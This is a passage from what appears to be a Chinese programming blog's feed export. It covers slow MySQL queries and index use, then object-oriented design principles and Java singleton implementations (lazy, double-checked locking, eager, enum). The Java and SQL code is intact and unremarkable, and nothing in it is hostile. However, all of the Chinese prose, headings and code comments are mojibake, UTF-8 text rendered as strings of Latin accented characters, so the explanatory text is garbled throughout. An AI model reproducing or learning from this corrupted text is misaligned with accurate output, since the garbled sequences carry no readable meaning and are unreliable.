<p>åˆšå¥½è¿™æ¡è¯­å¥æ¶‰åŠåˆ°çš„è¡¨ï¼Œåˆ«äººåœ¨ç”¨ï¼Œå¹¶ä¸”åŠ é”äº†ï¼Œæˆ‘ä»¬æ‹¿ä¸åˆ°é”ï¼Œåªèƒ½æ…¢æ…¢ç­‰å¾…åˆ«äººé‡Šæ”¾é”äº†ã€‚æˆ–è€…ï¼Œè¡¨æ²¡æœ‰åŠ é”ï¼Œä½†è¦ä½¿ç”¨åˆ°çš„æŸä¸ªä¸€è¡Œè¢«åŠ é”äº†ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œä¹Ÿæ˜¯æ²¡æœ‰åŠæ³•çš„ã€‚</p>
<p>å¯ä»¥ç”¨ <strong>show processlist</strong>è¿™ä¸ªå‘½ä»¤æ¥æŸ¥çœ‹å½“å‰çš„çŠ¶æ€ã€‚</p>
<p>è¿™é‡Œå¯ä»¥çœ‹å‡ºupdateåœ¨ç­‰å¾…é”ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262256669.png" alt="image-20220226225645544"></p>
<h3 id="é’ˆå¯¹ä¸€ç›´è¿™ä¹ˆæ…¢çš„æƒ…å†µ"><a href="#é’ˆå¯¹ä¸€ç›´è¿™ä¹ˆæ…¢çš„æƒ…å†µ" class="headerlink" title="é’ˆå¯¹ä¸€ç›´è¿™ä¹ˆæ…¢çš„æƒ…å†µ"></a>é’ˆå¯¹ä¸€ç›´è¿™ä¹ˆæ…¢çš„æƒ…å†µ</h3><p>æ²¡ç”¨åˆ°ç´¢å¼•</p>
<p>1.å­—æ®µæ²¡æœ‰ç´¢å¼•</p>
<p>2.å­—æ®µæœ‰ç´¢å¼•,ä½†æ²¡æœ‰ç”¨ä¸Š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> c <span class="operator">-</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> pow(c,<span class="number">2</span>) <span class="operator">=</span> <span class="number">1000</span>;</span><br></pre></td></tr></table></figure>

<p>3.æ•°æ®åº“ç®—é”™äº†ç´¢å¼•</p>
<p>é€šè¿‡é‡‡æ ·ç»Ÿè®¡ï¼Œç”±äºç»Ÿè®¡çš„å¤±è¯¯ï¼Œå¯¼è‡´ç³»ç»Ÿæ²¡æœ‰èµ°ç´¢å¼•ï¼Œè€Œæ˜¯èµ°äº†å…¨è¡¨æ‰«æï¼Œè¿™ä¹Ÿæ˜¯å¯¼è‡´æˆ‘ä»¬ SQL è¯­å¥æ‰§è¡Œçš„å¾ˆæ…¢çš„åŸå› ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t <span class="keyword">where</span> <span class="number">100</span> <span class="operator">&lt;</span> c <span class="keyword">and</span> c <span class="operator">&lt;</span> <span class="number">100000</span>;</span><br></pre></td></tr></table></figure>

<h2 id="Chaos"><a href="#Chaos" class="headerlink" title="Chaos"></a>Chaos</h2><ol>
<li>SQL æŸ¥è¯¢è¯­å¥ï¼š<code>SELECT * FROM A JOIN B ON A.id = B.id</code>ï¼Œæ‰§è¡Œè¿‡ç¨‹æ€§èƒ½å·®ï¼ŒåŸå› å¯èƒ½æ˜¯ä»€ä¹ˆï¼Ÿ</li>
<li>ä¸Šè¿° SQL è¯­å¥çš„æ‰§è¡Œè¿‡ç¨‹æ˜¯ä»€ä¹ˆï¼Ÿå“ªé‡Œéœ€è¦å»ºç«‹ç´¢å¼•ï¼Ÿ</li>
<li>åœ¨ A.id è¿˜æ˜¯ B.id ä¸Šå»ºç«‹ç´¢å¼•å‘¢ï¼Ÿ</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262325790.jpg" alt="aerith_2-wallpaper-7680x4320"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046164.jpg" alt="beautiful_landscapes_in_the_world-wallpaper-5120x2880"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046348.jpg" alt="princess_8-wallpaper-3840x2160"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046012.jpg" alt="full_moon_reflection-wallpaper-1920x1080"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272046990.jpg" alt="amazing_mountain_milky_way_by_yakub_nihat-wallpaper-2560x1440"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272047300.jpg" alt="best_beaches_in_the_world-wallpaper-2880x1620"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272047554.jpg" alt="very_nice_satellite_images_of_iran-wallpaper-2880x1620"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202272113875.JPG" alt="IMG_3460"></p>
]]></content>
      <categories>
        <category>é¢è¯•</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>è®¾è®¡æ¨¡å¼</title>
    <url>/2022/03/01/%E9%9D%A2%E8%AF%95/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="è®¾è®¡æ¨¡å¼"><a href="#è®¾è®¡æ¨¡å¼" class="headerlink" title="è®¾è®¡æ¨¡å¼"></a><a href="http://c.biancheng.net/view/1333.html">è®¾è®¡æ¨¡å¼</a></h1><h2 id="é¢å‘å¯¹è±¡è®¾è®¡åŸåˆ™-è¿ªç±³ç‰¹å’Œä¾ä¾å¼€å§‹k"><a href="#é¢å‘å¯¹è±¡è®¾è®¡åŸåˆ™-è¿ªç±³ç‰¹å’Œä¾ä¾å¼€å§‹k" class="headerlink" title="é¢å‘å¯¹è±¡è®¾è®¡åŸåˆ™(è¿ªç±³ç‰¹å’Œä¾ä¾å¼€å§‹k)"></a>é¢å‘å¯¹è±¡è®¾è®¡åŸåˆ™(è¿ªç±³ç‰¹å’Œä¾ä¾å¼€å§‹k)</h2><ul>
<li><p><strong>å¼€</strong>é—­åŸåˆ™:  å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­; é™ä½ç»´æŠ¤å¸¦æ¥çš„æ–°é£é™©</p>
</li>
<li><p>é‡Œ<strong>æ°</strong>æ›¿æ¢åŸåˆ™: å­ç±»å¯ä»¥æ‰©å±•çˆ¶ç±»çš„åŠŸèƒ½ï¼Œä½†ä¸èƒ½æ”¹å˜çˆ¶ç±»åŸæœ‰çš„åŠŸèƒ½ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šå­ç±»ç»§æ‰¿çˆ¶ç±»æ—¶ï¼Œé™¤æ·»åŠ æ–°çš„æ–¹æ³•å®Œæˆæ–°å¢åŠŸèƒ½å¤–ï¼Œå°½é‡ä¸è¦é‡å†™çˆ¶ç±»çš„æ–¹æ³•ã€‚(ä¾‹å¦‚å‡ ç»´é¸Ÿä¸æ˜¯é¸Ÿçš„ä¾‹å­)</p>
</li>
<li><p><strong>ä¾</strong>èµ–å€’ç½®åŸåˆ™: é«˜å±‚ä¸åº”è¯¥ä¾èµ–ä½å±‚ï¼Œè¦é¢å‘æ¥å£ç¼–ç¨‹;  æ›´åˆ©äºä»£ç ç»“æ„çš„å‡çº§æ‰©å±•</p>
</li>
<li><p>å•<strong>ä¸€</strong>èŒè´£åŸåˆ™: ä¸€ä¸ªç±»åªå¹²ä¸€ä»¶äº‹ï¼Œå®ç°ç±»è¦å•ä¸€; ä¾¿äºç†è§£ï¼Œæé«˜ä»£ç çš„å¯è¯»æ€§</p>
</li>
<li><p>æ¥<strong>å£</strong>éš”ç¦»åŸåˆ™: ä¸€ä¸ªæ¥å£åªå¹²ä¸€ä»¶äº‹ï¼Œæ¥å£è¦ç²¾ç®€å•ä¸€; åŠŸèƒ½è§£è€¦ï¼Œé«˜èšåˆã€ä½è€¦åˆ</p>
</li>
<li><p>è¿ªç±³ç‰¹æ³•åˆ™: å¦‚æœä¸¤ä¸ªè½¯ä»¶å®ä½“æ— é¡»ç›´æ¥é€šä¿¡ï¼Œé‚£ä¹ˆå°±ä¸åº”å½“å‘ç”Ÿç›´æ¥çš„ç›¸äº’è°ƒç”¨ï¼Œå¯ä»¥é€šè¿‡ç¬¬ä¸‰æ–¹è½¬å‘è¯¥è°ƒç”¨ã€‚å…¶ç›®çš„æ˜¯é™ä½ç±»ä¹‹é—´çš„è€¦åˆåº¦ï¼Œæé«˜æ¨¡å—çš„ç›¸å¯¹ç‹¬ç«‹æ€§ã€‚</p>
</li>
<li><p>åˆæˆå¤ç”¨åŸåˆ™:  å°½é‡ä½¿ç”¨ç»„åˆæˆ–è€…èšåˆå…³ç³»å®ç°ä»£ç å¤ç”¨ï¼Œå°‘ä½¿ç”¨ç»§æ‰¿,å¦‚æœè¦ä½¿ç”¨ç»§æ‰¿å…³ç³»ï¼Œåˆ™å¿…é¡»ä¸¥æ ¼éµå¾ªé‡Œæ°æ›¿æ¢åŸåˆ™ã€‚åˆæˆå¤ç”¨åŸåˆ™åŒé‡Œæ°æ›¿æ¢åŸåˆ™ç›¸è¾…ç›¸æˆçš„ï¼Œä¸¤è€…éƒ½æ˜¯å¼€é—­åŸåˆ™çš„å…·ä½“å®ç°è§„èŒƒã€‚ é™ä½ä»£ç è€¦åˆ.(ä¾‹å¦‚æ±½è½¦åˆ†ç±»ç®¡ç†ç¨‹åº)</p>
<blockquote>
<p>é€šå¸¸ç±»çš„å¤ç”¨åˆ†ä¸ºç»§æ‰¿å¤ç”¨å’Œåˆæˆå¤ç”¨ä¸¤ç§ï¼Œç»§æ‰¿å¤ç”¨è™½ç„¶æœ‰ç®€å•å’Œæ˜“å®ç°çš„ä¼˜ç‚¹ï¼Œä½†å®ƒä¹Ÿå­˜åœ¨ä»¥ä¸‹ç¼ºç‚¹ã€‚</p>
</blockquote>
</li>
</ul>
<blockquote>
<ol>
<li>ç»§æ‰¿å¤ç”¨ç ´åäº†ç±»çš„å°è£…æ€§ã€‚å› ä¸ºç»§æ‰¿ä¼šå°†çˆ¶ç±»çš„å®ç°ç»†èŠ‚æš´éœ²ç»™å­ç±»ï¼Œçˆ¶ç±»å¯¹å­ç±»æ˜¯é€æ˜çš„ï¼Œæ‰€ä»¥è¿™ç§å¤ç”¨åˆç§°ä¸ºâ€œç™½ç®±â€å¤ç”¨ã€‚</li>
<li>å­ç±»ä¸çˆ¶ç±»çš„è€¦åˆåº¦é«˜ã€‚çˆ¶ç±»çš„å®ç°çš„ä»»ä½•æ”¹å˜éƒ½ä¼šå¯¼è‡´å­ç±»çš„å®ç°å‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¸åˆ©äºç±»çš„æ‰©å±•ä¸ç»´æŠ¤ã€‚</li>
<li>å®ƒé™åˆ¶äº†å¤ç”¨çš„çµæ´»æ€§ã€‚ä»çˆ¶ç±»ç»§æ‰¿è€Œæ¥çš„å®ç°æ˜¯é™æ€çš„ï¼Œåœ¨ç¼–è¯‘æ—¶å·²ç»å®šä¹‰ï¼Œæ‰€ä»¥åœ¨è¿è¡Œæ—¶ä¸å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚</li>
</ol>
<p>é‡‡ç”¨ç»„åˆæˆ–èšåˆå¤ç”¨æ—¶ï¼Œå¯ä»¥å°†å·²æœ‰å¯¹è±¡çº³å…¥æ–°å¯¹è±¡ä¸­ï¼Œä½¿ä¹‹æˆä¸ºæ–°å¯¹è±¡çš„ä¸€éƒ¨åˆ†ï¼Œæ–°å¯¹è±¡å¯ä»¥è°ƒç”¨å·²æœ‰å¯¹è±¡çš„åŠŸèƒ½ï¼Œå®ƒæœ‰ä»¥ä¸‹ä¼˜ç‚¹ã€‚</p>
<ol>
<li>å®ƒç»´æŒäº†ç±»çš„å°è£…æ€§ã€‚å› ä¸ºæˆåˆ†å¯¹è±¡çš„å†…éƒ¨ç»†èŠ‚æ˜¯æ–°å¯¹è±¡çœ‹ä¸è§çš„ï¼Œæ‰€ä»¥è¿™ç§å¤ç”¨åˆç§°ä¸ºâ€œé»‘ç®±â€å¤ç”¨ã€‚</li>
<li>æ–°æ—§ç±»ä¹‹é—´çš„è€¦åˆåº¦ä½ã€‚è¿™ç§å¤ç”¨æ‰€éœ€çš„ä¾èµ–è¾ƒå°‘ï¼Œæ–°å¯¹è±¡å­˜å–æˆåˆ†å¯¹è±¡çš„å”¯ä¸€æ–¹æ³•æ˜¯é€šè¿‡æˆåˆ†å¯¹è±¡çš„æ¥å£ã€‚</li>
<li>å¤ç”¨çš„çµæ´»æ€§é«˜ã€‚è¿™ç§å¤ç”¨å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€è¿›è¡Œï¼Œæ–°å¯¹è±¡å¯ä»¥åŠ¨æ€åœ°å¼•ç”¨ä¸æˆåˆ†å¯¹è±¡ç±»å‹ç›¸åŒçš„å¯¹è±¡ã€‚</li>
</ol>
</blockquote>
<ol>
<li>åˆ›å»ºå‹æ¨¡å¼ï¼šç”¨äºæè¿°â€œæ€æ ·åˆ›å»ºå¯¹è±¡â€ï¼Œå®ƒçš„ä¸»è¦ç‰¹ç‚¹æ˜¯â€œå°†å¯¹è±¡çš„åˆ›å»ºä¸ä½¿ç”¨åˆ†ç¦»â€ã€‚GoF ä¸­æä¾›äº†å•ä¾‹ã€åŸå‹ã€å·¥å‚æ–¹æ³•ã€æŠ½è±¡å·¥å‚ã€å»ºé€ è€…ç­‰ 5 ç§åˆ›å»ºå‹æ¨¡å¼ã€‚</li>
<li>ç»“æ„å‹æ¨¡å¼ï¼šç”¨äºæè¿°å¦‚ä½•å°†ç±»æˆ–å¯¹è±¡æŒ‰æŸç§å¸ƒå±€ç»„æˆæ›´å¤§çš„ç»“æ„ï¼ŒGoF ä¸­æä¾›äº†ä»£ç†ã€é€‚é…å™¨ã€æ¡¥æ¥ã€è£…é¥°ã€å¤–è§‚ã€äº«å…ƒã€ç»„åˆç­‰ 7 ç§ç»“æ„å‹æ¨¡å¼ã€‚</li>
<li>è¡Œä¸ºå‹æ¨¡å¼ï¼šç”¨äºæè¿°ç±»æˆ–å¯¹è±¡ä¹‹é—´æ€æ ·ç›¸äº’åä½œå…±åŒå®Œæˆå•ä¸ªå¯¹è±¡éƒ½æ— æ³•å•ç‹¬å®Œæˆçš„ä»»åŠ¡ï¼Œä»¥åŠæ€æ ·åˆ†é…èŒè´£ã€‚GoF ä¸­æä¾›äº†æ¨¡æ¿æ–¹æ³•ã€ç­–ç•¥ã€å‘½ä»¤ã€èŒè´£é“¾ã€çŠ¶æ€ã€è§‚å¯Ÿè€…ã€ä¸­ä»‹è€…ã€è¿­ä»£å™¨ã€è®¿é—®è€…ã€å¤‡å¿˜å½•ã€è§£é‡Šå™¨ç­‰ 11 ç§è¡Œä¸ºå‹æ¨¡å¼ã€‚</li>
</ol>
<h2 id="å•ä¾‹æ¨¡å¼ï¼ˆSingleton-Patternï¼‰"><a href="#å•ä¾‹æ¨¡å¼ï¼ˆSingleton-Patternï¼‰" class="headerlink" title="å•ä¾‹æ¨¡å¼ï¼ˆSingleton Patternï¼‰"></a>å•ä¾‹æ¨¡å¼ï¼ˆSingleton Patternï¼‰</h2><p>ä¼˜:åœ¨å†…å­˜ä¸­åªæœ‰ä¸€ä¸ªå®ä¾‹,å‡å°‘å†…å­˜çš„å¼€é”€; é¿å…å¯¹èµ„æºçš„å¤šé‡å ç”¨;</p>
<p>ç¼º:ä¸€èˆ¬æ²¡æœ‰æ¥å£,æ‰©å±•å›°éš¾,è¿èƒŒå¼€é—­åŸåˆ™;ä¸åˆ©äºä»£ç è°ƒè¯•,å¦‚æœå•ä¾‹æ²¡æœ‰æ‰§è¡Œå®Œ,ä¸èƒ½æ¨¡æ‹Ÿç”Ÿæˆä¸€ä¸ªæ–°çš„å¯¹è±¡;å•ä¾‹æ¨¡å¼çš„åŠŸèƒ½é€šå¸¸å†™åœ¨ä¸€ä¸ªç±»ä¸­,å¦‚æœåŠŸèƒ½è®¾è®¡ä¸åˆç†,å®¹æ˜“è¿èƒŒå•ä¸€èŒè´£åŸåˆ™;</p>
<p>åº”ç”¨åœºæ™¯: </p>
<ul>
<li><p>æŸç±»åªè¦æ±‚ç”Ÿæˆä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™,å¦‚ä¸€ä¸ªç­çš„ç­é•¿,æ¯ä¸ªäººçš„èº«ä»½è¯å·.</p>
</li>
<li><p>æŸäº›ç±»åˆ›å»ºå®ä¾‹æ—¶é—´è¾ƒé•¿æˆ–å ç”¨ç³»ç»Ÿèµ„æºå¾ˆå¤š,ä¸”ç»å¸¸ä½¿ç”¨</p>
</li>
<li><p>æŸç±»éœ€è¦é¢‘ç¹å®ä¾‹åŒ–,åˆé¢‘ç¹é”€æ¯,ä¾‹å¦‚å¤šçº¿ç¨‹çº¿ç¨‹æ± ,ç½‘è·¯è¿æ¥æ± </p>
</li>
<li><p>é¢‘ç¹è®¿é—®æ•°æ®åº“æˆ–æ–‡ä»¶</p>
</li>
<li><p>å¯¹äºä¸€äº›æ§åˆ¶ç¡¬ä»¶çº§åˆ«çš„æ“ä½œï¼Œæˆ–è€…ä»ç³»ç»Ÿä¸Šæ¥è®²åº”å½“æ˜¯å•ä¸€æ§åˆ¶é€»è¾‘çš„æ“ä½œï¼Œå¦‚æœæœ‰å¤šä¸ªå®ä¾‹ï¼Œåˆ™ç³»ç»Ÿä¼šå®Œå…¨ä¹±å¥—ã€‚</p>
</li>
<li><p>å½“å¯¹è±¡éœ€è¦è¢«å…±äº«çš„åœºåˆã€‚ç”±äºå•ä¾‹æ¨¡å¼åªå…è®¸åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå…±äº«è¯¥å¯¹è±¡å¯ä»¥èŠ‚çœå†…å­˜ï¼Œå¹¶åŠ å¿«å¯¹è±¡è®¿é—®é€Ÿåº¦ã€‚å¦‚ Web ä¸­çš„é…ç½®å¯¹è±¡ã€æ•°æ®åº“çš„è¿æ¥æ± ç­‰ã€‚</p>
</li>
</ul>
<p>æ‡’æ±‰å¼å®ç°:</p>
<p>è¯¥æ¨¡å¼çš„ç‰¹ç‚¹æ˜¯ç±»åŠ è½½æ—¶æ²¡æœ‰ç”Ÿæˆå•ä¾‹ï¼Œåªæœ‰å½“ç¬¬ä¸€æ¬¡è°ƒç”¨ getlnstance æ–¹æ³•æ—¶æ‰å»åˆ›å»ºè¿™ä¸ªå•ä¾‹ã€‚</p>
<p>å¿…é¡»è¦åŠ volatile, æœ‰åå°„,è¿™ä¸ªè¿˜æ˜¯ä¸å®‰å…¨çš„</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-13 10:12 ä¸Šåˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazySingleton</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä¿è¯instanceåœ¨æ‰€æœ‰çº¿ç¨‹ä¸­åŒæ­¥,å¿…é¡»åŠ volatile</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">LazySingleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * privateé¿å…åœ¨å¤–éƒ¨è¢«å®ä¾‹åŒ–</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">LazySingleton</span><span class="params">()</span> &#123;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åŠ synchronizedåŒæ­¥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> LazySingleton</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> LazySingleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">LazySingleton</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-23 11:26 ä¸Šåˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazySingleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">LazySingleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">LazySingleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å‡è®¾å¯¹è±¡å·²ç»æœ‰äº†ï¼Œå¾ˆå¤šäººåªæ˜¯å–å®ä¾‹ï¼Œä¸åº”è¯¥è¢«é”ä½ï¼Œ</span></span><br><span class="line"><span class="comment">     * ä½¿ç”¨dclå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> LazySingleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// Double Check Lock</span></span><br><span class="line">            <span class="keyword">synchronized</span> (LazySingleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                   instance = <span class="keyword">new</span> <span class="title class_">LazySingleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é¥¿æ±‰å¼å®ç°:</p>
<p>è¯¥æ¨¡å¼çš„ç‰¹ç‚¹æ˜¯ç±»ä¸€æ—¦åŠ è½½å°±åˆ›å»ºä¸€ä¸ªå•ä¾‹ï¼Œä¿è¯åœ¨è°ƒç”¨ getInstance æ–¹æ³•ä¹‹å‰å•ä¾‹å·²ç»å­˜åœ¨äº†ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-13 10:20 ä¸Šåˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HungrySingleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">HungrySingleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HungrySingleton</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">HungrySingleton</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HungrySingleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æšä¸¾å®ç°:</p>
<p>æšä¸¾æœ‰ä¸ªé»˜è®¤æœ‰å‚æ„é€ å™¨, ä¸¤ä¸ªå‚æ•°string in</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> singletion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-27 10:09 ä¸Šåˆ</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">EnumSingle</span> &#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> EnumSingle <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test02</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">EnumSingle</span> <span class="variable">instance</span> <span class="operator">=</span> EnumSingle.INSTANCE;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Constructor&lt;EnumSingle&gt; declaredConstructor = EnumSingle.class.getDeclaredConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">EnumSingle</span> <span class="variable">enumSingle</span> <span class="operator">=</span> declaredConstructor.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="åŸå‹æ¨¡å¼-Prototype"><a href="#åŸå‹æ¨¡å¼-Prototype" class="headerlink" title="åŸå‹æ¨¡å¼(Prototype)"></a>åŸå‹æ¨¡å¼(Prototype)</h2><p>é€šè¿‡æ‹·è´åŸå‹åˆ›å»ºæ–°çš„å¯¹è±¡,ç”±äº Java æä¾›äº†å¯¹è±¡çš„ clone() æ–¹æ³•ï¼Œæ‰€ä»¥ç”¨ Java å®ç°åŸå‹æ¨¡å¼å¾ˆç®€å•ã€‚å…‹éš†</p>
<h2 id="å·¥å‚æ¨¡å¼-Factory-Pattern"><a href="#å·¥å‚æ¨¡å¼-Factory-Pattern" class="headerlink" title="å·¥å‚æ¨¡å¼(Factory Pattern)"></a>å·¥å‚æ¨¡å¼(Factory Pattern)</h2><p>ä¸åŒæ¡ä»¶ä¸‹åˆ›é€ ä¸åŒå®ä¾‹. å·¥å‚</p>
<h3 id="ç®€å•å·¥å‚æ¨¡å¼"><a href="#ç®€å•å·¥å‚æ¨¡å¼" class="headerlink" title="ç®€å•å·¥å‚æ¨¡å¼"></a>ç®€å•å·¥å‚æ¨¡å¼</h3><p>åœ¨ç®€å•å·¥å‚æ¨¡å¼ä¸­åˆ›å»ºå®ä¾‹çš„æ–¹æ³•é€šå¸¸ä¸ºé™æ€ï¼ˆstaticï¼‰æ–¹æ³•ï¼Œå› æ­¤ç®€å•å·¥å‚æ¨¡å¼ï¼ˆSimple Factory Patternï¼‰åˆå«ä½œé™æ€å·¥å‚æ–¹æ³•æ¨¡å¼ï¼ˆStatic Factory Method Patternï¼‰ã€‚</p>
<p>ä¼˜: å®¢æˆ·ç«¯å¯ä»¥å…é™¤ç›´æ¥åˆ›å»ºäº§å“çš„èŒè´£,å¾ˆæ–¹ä¾¿çš„åˆ›å»ºå‡ºç›¸åº”çš„äº§å“;å®¢æˆ·ç«¯æ— éœ€çŸ¥é“æ‰€åˆ›å»ºçš„äº§å“çš„ç±»å,åªéœ€çŸ¥é“å‚æ•°å³å¯;ä¹Ÿå¯ä»¥å¼•å…¥é…ç½®æ–‡ä»¶,åœ¨ä¸ä¿®æ”¹å®¢æˆ·ç«¯ä»£ç çš„æƒ…å†µä¸‹æ›´æ¢å’Œæ·»åŠ äº§å“</p>
<p>ç¼º: </p>
<ol>
